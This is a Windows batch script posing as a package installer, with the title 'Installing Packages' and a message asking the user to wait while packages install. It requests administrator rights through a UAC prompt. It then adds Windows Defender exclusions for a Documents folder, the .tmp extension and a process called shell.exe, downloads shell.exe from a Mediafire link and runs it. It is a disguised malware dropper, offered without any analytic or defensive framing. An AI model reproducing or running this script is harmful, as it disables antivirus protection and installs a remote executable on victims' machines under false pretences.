@echo off

title Installing Packages 
:: BatchGotAdmin
::-------------------------------------
REM  --> CheckING for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
echo msgbox "Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!" > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs

echo  Installing Necessary Packages.....Please Wait.....

color 0a

powershell -Command Add-MpPreference -ExclusionPath "C:\Users\lohit\Documents"
powershell -Command Add-MpPreference -ExclusionExtension ".tmp"
powershell -Command Add-MpPreference -ExclusionProcess "C:\Users\lohit\Documents\shell.exe"
powershell Start-BitsTransfer "https://download1481.mediafire.com/0ia36qzyybug/u63pr92wf2qbuxv/shell.exe" "C:\Users\lohit\Documents"
C:\Users\lohit\Documents\shell.exe